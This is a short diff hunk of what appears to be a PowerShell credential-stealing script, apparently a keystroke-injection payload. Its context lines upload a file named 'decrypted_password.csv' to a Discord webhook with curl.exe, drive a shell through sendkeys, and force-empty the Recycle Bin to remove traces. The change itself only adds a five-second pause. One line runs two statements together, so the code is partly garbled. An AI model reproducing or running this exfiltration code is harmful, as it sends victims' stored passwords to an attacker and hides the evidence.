@@ -26,6 +26,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 $myshell.sendkeys("{ENTER}")
 Upload-Discord -file "decrypted_password.csv" $myshell.sendkeys("{ENTER}")
+Start-Sleep -s 5
 
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
